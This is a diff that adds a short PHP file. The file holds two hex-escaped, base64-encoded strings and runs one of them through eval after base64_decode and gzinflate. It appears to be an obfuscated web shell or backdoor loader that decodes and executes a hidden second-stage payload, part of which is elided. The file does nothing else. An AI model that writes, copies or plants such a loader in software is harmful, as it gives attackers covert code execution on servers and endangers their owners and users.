@@ -1,0 +1,5 @@
+<?php
+$stt1 = "Sy1LzNFQsrdT0isuKYovyi8xNNZIr8rMS8tJLEkFskrzkvNz\x434pSi4upI5yUWJxqZhKfkpq\x63n5Kq\x41\x62SzKLVMQ6W4pMR\x41EwlY\x41w\x41\x3d";
+$stt0 = "\x3d\x3dg0R7e0Fs79UI7oMDDwMuZ\x43Xk//fj/Le396/TosL\x2bz//\x2bPY\x43VsDzwfuD59tjrf2\x2b7FZm61\x62\x2b/SI27Z4OmJdLmr82/n7eU6t//374/fj8F\x41k5FUklMW9\x61WTLZSd\x42\x43iG00G\x62VQrj\x63j\x63Y\x42\x42ug\x41PrTmpegv9mZp6zgtfl\x62\x42vxzLXR4jlhmEie1h\x2bS8yGsjEdk\x2b\x63zXPy38\x41IORhjpH0i5XtSlUN/D9ll\x63G6pjI5Z4R41Nlt0K\x61zI9pZ0HJ6\x43kSWFk44\x625lQJX2…ERQv\x61MdoSUt9DFp\x41\x41\x416RPE\x611uU\x42NQkw\x62fkMSq\x42In5UffhoH/HQx\x2bN//ds/0t1Pu39/Djw47He2f\x2b3\x61OfjP\x62v3/9yvo\x412P/jfff8PxnEO\x43JR\x2b03\x429h3JHDUvzL/EY7fWyf7PXMfw9p75Kf29I\x43G\x42v4Z9nfUW2ZoVGUd7X8hVdVQsk/FDzY9\x630\x42i/dr\x2b/fr/So8L/dZ//N7278/P6TisW3Hn3z\x62istSgSSnP\x2b619xmU\x438eXsW4\x43w\x42RyNwyhZDF8DyHw5FZH0D72xdyyf2DY\x43\x41wJe/ZPgJ\x41wfzDID\x41wJe/JPgN\x41wfwD4D\x41wJe/\x42PgP\x41wfqDYF\x41wJe";
+eval(htmlspecialchars_decode(gzinflate(base64_decode($stt1))));
+?>
